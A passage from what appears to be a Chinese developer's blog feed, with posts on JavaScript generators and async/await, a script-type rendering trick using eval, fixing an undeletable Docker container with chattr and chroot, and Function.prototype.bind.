很优雅，可以很好地解决上面提到的问题，但是一个是因为程序员比较懒，一个是因为 Promise 写多了确实有点烦，所以大家就又开始找新的解决顺序依赖的方式。</p><p>先说为什么比较烦，上面的例子因为逻辑很简单，而且只有三个显式的顺序依赖所以可能不太明显，但是想象一下如果顺序很多，那么代码里基本上全是 then then then，一个是放眼望去基本看不出主要的逻辑，另一个是…顺序依赖其实是一个挺大众的需求，如果有一个语法糖能提供更好的支持，那真的是一件令人高兴的事情。</p><p>于是我们的主角就出场了，它叫 await ，平时只喜欢和 async 待在一起，对于具体的用法稍稍 STFW 一下就有很多，所以我比较想从 Generator + Promise 的角度来描写它，那么下面就先来说一下 Generator。</p><h1 id="0x5-关于-Generator"><a href="#0x5-关于-Generator" class="headerlink" title="0x5 关于 Generator"></a>0x5 关于 Generator</h1><p>Generator 这个概念（机制）也不是 Js 这门语言独有的，比如 Python 中就有同样的机制。在 Js 中，一个 Generator 是一个带星号的函数，内部可以通过 yield 关键字来“送出”和“接收”数据，它大概长下面的样子，这里就不详细介绍它了，具体的机制可以看相关的<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Generator" target="_blank" rel="noopener">文档</a>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">ImaGenerator</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> data = <span class="keyword">yield</span> <span class="string">"Send data from generator"</span></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">"Get data from main:"</span>, data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> gen = ImaGenerator()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Get data from generator:"</span>, gen.next().value)</span><br><span class="line">gen.next(<span class="string">"Send data from main"</span>)</span><br></pre></td></tr></table></figure><p>可能是由于代码量比较少，平时写的时候还没用实际到过这项技术，不过我还是比较感谢曾经学习了它的自己，让我能够借助它来更好地理解 async/await。</p><p>前面说过，异步可以被理解成是一种在两个顺序流程之间切换并传递信息的运行模式，那么如果把这个思想落实到 Generator 上就可以发现，yield 关键字既可以让流程从 Generator 中切换到外部执行流，又可以携带特定的信息；next 方法在另一方面使得流程回到 Generator 中成为可能。</p><p>于是，通过观察前面 CallBack 和 Promise 阅读文件的例子，就可以发现其具备特定的规律，从而结合 Generator 写出如下的代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// callback + generator 的例子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Thunkify</span> (<span class="params">fn</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">argExceptCb</span> (<span class="params">...args</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="title">argIncludeCb</span> (<span class="params">cb</span>) </span>&#123;</span><br><span class="line">      fn.call(fn, ...args, cb)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> readFile = Thunkify(fs.readFile)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">readFiles</span> (<span class="params">...filenames</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (fn <span class="keyword">of</span> filenames) &#123;</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">yield</span> readFile(fn)</span><br><span class="line">    <span class="built_in">console</span>.log(content)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runThunkifyGen</span> (<span class="params">gen</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">next</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> ret = gen.next(data)    </span><br><span class="line">    <span class="keyword">if</span> (ret.done) <span class="keyword">return</span></span><br><span class="line">    ret.value(next)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  next()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">runThunkifyGen(readFiles(<span class="string">'file1'</span>, <span class="string">'file2'</span>, <span class="string">'file3'</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Read done'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// promise + generator 的例子</span></span><br><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>).promises</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autorun</span> (<span class="params">gen</span>) </span>&#123;</span><br><span class="line">  (<span class="function"><span class="keyword">function</span> <span class="title">next</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> ret = gen.next(data)</span><br><span class="line">    <span class="keyword">if</span> (ret.done) <span class="keyword">return</span></span><br><span class="line">    ret.value.then(<span class="function"><span class="params">data</span> =&gt;</span> next(data.toString()))</span><br><span class="line">  &#125;)()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">readFiles</span> (<span class="params">...filenames</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (fn <span class="keyword">of</span> filenames) &#123;</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">yield</span> readFile(fn)</span><br><span class="line">    <span class="built_in">console</span>.log(content)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">autorun(readFiles(<span class="string">'file1'</span>, <span class="string">'file2'</span>, <span class="string">'file3'</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Read done"</span>)</span><br></pre></td></tr></table></figure><p>例子中的 autorun 和 runThunkifyGen 函数被称为 <strong>执行器</strong>，用于自动将流程在 Generator 和调用方之间切换，并保证读取的文件顺序。</p><p>可以看到，实际上执行器就是提取出了 callback 和 then 的部分，在这里用户需要关注的只有 readFiles 这一个函数，而两个例子中，readFiles 长得一模一样。</p><p>那么如果我们把目光着眼于更一般的场景，是否可以结合 Generator 和执行器来让其达到普适呢？答案是可以的，下面给出代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">async</span> (<span class="params">fn</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">step</span> (<span class="params">gen, data</span>) </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> next = gen.next(data)</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">Promise</span>.reject(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> next.done</span><br><span class="line">      ? <span class="built_in">Promise</span>.resolve(next.value)</span><br><span class="line">      : <span class="built_in">Promise</span>.resolve(next.value)</span><br><span class="line">      .then(<span class="function"><span class="params">data</span> =&gt;</span> step(gen, data))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> gen = fn()</span><br><span class="line"><span class="keyword">return</span> step(gen)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>async 函数接受一个 Generator，然后返回一个新的函数，这个函数在内部递归调用 step，这个 step 其实就是执行器（其实可以通过 IIFE 使得 step 变成单例，不过这里就不考虑这些了）。</p><p>和上面不同的地方在于，前面的两个都分别假定了 yield 后面跟随的要么是一个 thunk，要么是一个promise，而 async 则支持 yield 后面跟随一般值，能做到这一点的原因在于 Promise.resolve 和 Promise.reject ，其具体的机制可以查看MDN。</p><p>那么该如何使用 async 呢，继续回到之前按顺序打开并读取文件的例子，我们的代码会变成这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>).promises </span><br><span class="line"><span class="keyword">const</span> func1 = <span class="keyword">async</span>(<span class="function"><span class="keyword">function</span> *(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> data1 = <span class="keyword">yield</span> readFile(<span class="string">'file1'</span>)</span><br><span class="line"><span class="keyword">const</span> data2 = <span class="keyword">yield</span> readFile(<span class="string">'file2'</span>)</span><br><span class="line">  <span class="keyword">const</span> data3 = <span class="keyword">yield</span> readFile(<span class="string">'file3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'data1:'</span>, data1.toString())</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'data2:'</span>, data2.toString())</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'data3:'</span>, data3.toString())</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>已经对 async/await 有所了解的小伙伴可以发现，同样的逻辑，如果使用这一对新人，则代码会变成这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>).promises</span><br><span class="line"><span class="keyword">const</span> func2 = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> data1 = <span class="keyword">await</span> readFile(<span class="string">'file1'</span>)</span><br><span class="line"><span class="keyword">const</span> data2 = <span class="keyword">await</span> readFile(<span class="string">'file2'</span>)</span><br><span class="line">  <span class="keyword">const</span> data3 = <span class="keyword">await</span> readFile(<span class="string">'file3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'data1:'</span>, data1.toString())</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'data2:'</span>, data2.toString())</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'data3:'</span>, data3.toString())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很相似，对吧？</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一个关于 script 标签的 type 属性的另类用法</title>
      <link href="/2020/09/25/ScriptType/"/>
      <url>/2020/09/25/ScriptType/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天出于好奇跑去 React 官网转了一圈，看到里面提供了一个 <a href="https://raw.githubusercontent.com/reactjs/reactjs.org/master/static/html/single-file-example.html" target="_blank" rel="noopener">无需构建工具</a> 的体验例子，看到代码后感觉很神奇，因为它直接在 script 里的 render 函数中写入了 JSX ，并且成功渲染到了视图里，但是这种语法显然不是被允许的，红色的 <code>Uncaught SyntaxError: expected expression, got &#39;&lt;&#39;</code> 是应该出现在 console 中的。</p><h1 id="0x01-原理及实现"><a href="#0x01-原理及实现" class="headerlink" title="0x01 原理及实现"></a>0x01 原理及实现</h1><p>思来想去，突然发现 script 中的 type 标签里并不是常规的 text/javascript ，而是非标准的 text/babel ，那么这个东西有什么影响呢？</p><p>其实把这段代码复制到一个带语法高亮的编辑器中应该就能看到异样了，比如扔进我本地使用的 vscode 时就可以发现，script 标签中并没有提供语法高亮和代码补全功能。</p><p>STFW 后得知，对于这种 type ，浏览器不会将其看作将被执行的 script ，而是当作普通的标签元素来看待，而既然这里的 type 是 babel，上面的 script:src 也引入了 babel ，那么想来编译并执行这段纯文本就是它的工作了。</p><p>知道了这个原理后，就可以写出简单的渲染方法了，代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML 文件 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Render-Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"render.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/react"</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"Output msg to console"</span>)</span></span><br><span class="line"></span><br><span class="line">    render(</span><br><span class="line"></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, React!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">spanInputBox</span>&lt;/<span class="attr">span</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"alert('Hello!')"</span>&gt;</span>clickMe<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span>,</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">'app'</span>)</span></span><br><span class="line"></span><br><span class="line">    )</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>render.js 文件内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> pattern = <span class="regexp">/\s*render\s*\(\s*(&lt;.+&gt;)/g</span>s</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> scriptList = <span class="built_in">document</span>.querySelectorAll(<span class="string">'script[type="text/react"]'</span>)</span><br><span class="line"></span><br><span class="line">  globalThis.render = <span class="function"><span class="keyword">function</span> (<span class="params">template, node</span>) </span>&#123;</span><br><span class="line">    node.innerHTML = template</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> script <span class="keyword">of</span> scriptList) &#123;</span><br><span class="line">    <span class="built_in">eval</span>(script.textContent.replaceAll(</span><br><span class="line">      pattern,</span><br><span class="line">      (_, template) =&gt; <span class="string">`;render(\`<span class="subst">$&#123;template&#125;</span>\``</span>       </span><br><span class="line">    ))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概思路就是找到所有 type 相符的 script 标签，给 jsx 的部分加上引号，然后把整坨内容扔进 eval 里跑一下，当然现实中肯定不会这么简单粗暴，这里只能说是一个 POC 吧。</p><h1 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><p>没什么总结的，就是闲着没事水了一篇博客而已（</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>测试 Github Actions</title>
      <link href="/2020/09/03/GitActionsTest/"/>
      <url>/2020/09/03/GitActionsTest/</url>
      
        <content type="html"><![CDATA[<p>Congratulations to myself :-)</p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次手贱的经历与解决办法</title>
      <link href="/2020/09/01/Docker-Chattr/"/>
      <url>/2020/09/01/Docker-Chattr/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-起因"><a href="#0x0-起因" class="headerlink" title="0x0 起因"></a>0x0 起因</h1><p>一直以来对 Linux 的权限管理都仅仅停留在 “知道有这种机制存在” 的程度上，最近为某比赛出题时因为要有 getshell 的环境，所以就趁机了解了一下其中的一些理论和对应的命令。</p><p>由于我本人平时使用的是 MacOS 系统，再加上赛题环境也要扔到 docker 中，所以在学习权限管理时在 docker 里开了一个容器作为环境，测试的命令包括 chown，chroot，lsattr，chattr… 等等（这里插一句题外话，为了在容器中运行 chattr ，需要在启动时加上 <code>--cap-add LINUX_IMMUTABLE</code> 参数来为其赋予一个 capability ），在了解到可以开始创建赛题环境的程度后，我退出了容器，并运行了 <code>docker rm ...</code> 来将测试用的容器删除掉。</p><p>正当我准备开始输入命令创建新的容器时，却看到 docker 并没有正常删除测试用容器，取而代之地返回了一条蜜汁信息（这里省略了容器对应的两个哈希，该哈希对应我上文提到的那个用于测试权限管理的容器）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error response from daemon: container ...: driver "overlay2" failed to remove root filesystem: unlinkat /var/lib/docker/overlay2/.../diff/test/file: operation not permitted</span><br></pre></td></tr></table></figure><p>可以看到，大意是 docker 没有权限删除容器中的 /test/file 文件，比较幸运地，我记得这个文件是经历了 <code>chattr +a file</code> 处理后的文件，这个隐藏属性使得文件只可被追加新的内容而不可被删除或者修改。</p><p>起初我觉得这个问题很好解决（实际也很好解决，只不过和我开始想的不同），如果是在 docker for linux 上，直接在宿主机切到对应的目录后运行 <code>chattr -a file</code> 去掉隐藏属性，然后继续运行 <code>docker rm ...</code> 删掉容器即可；docker for macos 无非就是多了一层 HyperKit，可以用 screen 进入到 vm 中（我本机上是 <code>screen ~/Library/Containers/com.docker.docker/Data/vms/0/tty</code>），然后进行和上文相同的操作。</p><p>然而进去才发现，这个 vm 提供的命令太少了，根本没有 chattr 命令可用，尝试搜索是否有等效的命令可用也没有搜到，更没有人手贱到和我一样，所以现在的场景也没有先人的经验可以学习。虽然这一个容器本身并没有占多大的空间，但是强迫症使然，我还是想把它删除掉:-P</p><h1 id="0x1-解决办法"><a href="#0x1-解决办法" class="headerlink" title="0x1 解决办法"></a>0x1 解决办法</h1><h2 id="0x10-Hard-Reset"><a href="#0x10-Hard-Reset" class="headerlink" title="0x10 Hard Reset"></a>0x10 Hard Reset</h2><p>最初我尝试自己在 StackOverflow 上提出了这一问题，然而也不知道是因为环境描述的不到位还是因为自己小学水平的英文写作能力，下面的答复甚至都没有对应到这个问题上…</p><p>只有一位老哥给了还算靠谱的答复，他建议我强制重置 docker desktop for mac 的状态（Troubleshoot/Reset disk image 或者 Troubleshoot/Reset to factory defaults），这俩都会清空当前的所有的镜像和容器，后者还会顺手把应用重置成刚被安装后的状态。</p><p>确实是一个解决办法，不过因为我平时都是把 docker 当虚拟机用的，所以本机上存着各种镜像，其中还包括好多自定制的，一个一个导出来实在是太过麻烦，而我又不怎么了解这些镜像是怎么个存储机制，胡乱备份的话还担心弄出别的问题，所以就放弃了这个办法。</p><h2 id="0x11-Chroot"><a href="#0x11-Chroot" class="headerlink" title="0x11 Chroot"></a>0x11 Chroot</h2><p>在 vm 里畅游了一阵子后，我偶然发现这货还是有 chroot 可以用的，于是随便切到一个包含根目录的容器层里（我本机的路径是 <code>/var/lib/docker/overlay2/.../diff</code> ，这里依然省略了哈希），试着执行了一下 <code>chroot . /bin/bash</code> ，虽然给了一条 <code>groups: cannot find name for group ID 11</code> 的奇怪信息，不过还是顺利地进入到了 bash 环境中，而且测试了一下后发现 chattr 命令可用。</p><p>这样的话就好办多了，<strong>在无法删除的文件所在的文件夹或父文件夹中构建出 chattr 的运行环境，然后利用 chroot 运行 <code>chattr -a file</code> 来删除文件的隐藏属性，再在宿主机中运行 <code>docker rm ...</code> 即可</strong></p><p>在其他容器中（下文用 other 来指代）用 ldd 查看下 chattr 依赖的动态链接库，得到结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@docker-desktop:/# ldd $(which chattr)</span><br><span class="line">        linux-vdso.so.1 (0x00007ffebb9fc000)</span><br><span class="line">        libe2p.so.2 =&gt; /lib/x86_64-linux-gnu/libe2p.so.2 (0x00007f6ce8b0a000)</span><br><span class="line">        libcom_err.so.2 =&gt; /lib/x86_64-linux-gnu/libcom_err.so.2 (0x00007f6ce8906000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6ce8515000)</span><br><span class="line">        libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f6ce82f6000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007f6ce8f17000)</span><br></pre></td></tr></table></figure><p>可以看到依赖库都在 /lib/x86_64-linux-gnu/ 和 /lib64/ 文件夹中，所以在目标文件夹（这里指无法删除的文件 file 所在的文件夹）中用 <code>cp -R</code> 把 other 中这两个文件夹中的内容拷贝过来，再把 chattr 的 ELF 文件拷到目标文件夹中，最后在目标文件夹中运行 <code>chroot . ./chattr -a file</code> 即可。</p><p>删除了隐藏属性后，切回到宿主机中，然后运行 <code>docker rm ...</code> 就可以顺利删除掉这个出了问题的容器了。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF练习集</title>
      <link href="/2020/08/04/CTF-Exercises/"/>
      <url>/2020/08/04/CTF-Exercises/</url>
      
        <content type="html"><![CDATA[<script>window.location = "https://www.cnblogs.com/yuren123/"</script><p>如果看到这段话，说明自动跳转没有作用，请访问<a href="https://www.cnblogs.com/yuren123/" target="_blank" rel="noopener">链接</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>函数 Function.prototype.bind 的几个场景</title>
      <link href="/2020/08/04/FunctionBind/"/>
      <url>/2020/08/04/FunctionBind/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>一直以来都没想到 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/bind" target="_blank" rel="noopener">bind</a> 函数的具体应用场景，最近读某源码时偶然在一个类声明中看到了下面第一个场景中的代码，由此联想到了一些其他内容，这里记录一下</p><h1 id="0x1-第一个场景"><a href="#0x1-第一个场景" class="headerlink" title="0x1 第一个场景"></a>0x1 第一个场景</h1><p>相关的核心代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 类名为 Directive</span></span><br><span class="line"><span class="keyword">this</span>._update = <span class="function"><span class="keyword">function</span> (<span class="params">val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.update(val) <span class="comment">//该方法同样被定义在该类中，用于更新属性，这里因篇幅原因不给出</span></span><br><span class="line">&#125;.bind(<span class="keyword">this</span>)</span><br></pre></td></tr></table></figure><p>该方法在这个类之后的代码中被作为回调函数传给了另一个 Watcher 对象，代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> watcher = <span class="keyword">this</span>._watcher = <span class="keyword">new</span> Watcher(..., <span class="keyword">this</span>._update)</span><br></pre></td></tr></table></figure><p>这个 Watcher 对象<strong>将 _update 函数作为一个属性保存在了自己的作用域</strong>中，并在用户触发相应的事件后执行回调。</p><p>这个场景下的本意是 Watcher 在监测到事件发生后调用 Directive._update 方法来更新对应的 Directive 实例中的属性，然而我们知道，Javascript 中的 this 是会根据上下文进行变化的（这里不考虑箭头函数等特殊情况），当 Watcher 把 _update 作为自己的属性时，这个 this 就从 Directive 变成 Watcher 了，之后的更新也都会发生在 Watcher 中，这显然偏离了本意。</p><p>而 bind 的作用在于，它强制绑定了代码中 this 的值，使这个函数在赋值给其他对象作为属性且通过该对象进行调用时依然以 bind 中的参数作为 this ，在这里就达到了场景本身的需求。</p><h1 id="0x2-第二个场景"><a href="#0x2-第二个场景" class="headerlink" title="0x2 第二个场景"></a>0x2 第二个场景</h1><p>上面的例子并不是一个经常会遇到的场景，下面给出一个更普遍一些的情况：假设我们在视图中有一系列按钮通过绑定事件来操作一个 Object 中的属性，由于在 js 的逻辑中也有可能用到同样的属性操作，所以这些操作可以作为该对象的方法，然后将该方法作为回调函数传给对应的 Listener ，代码大概如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 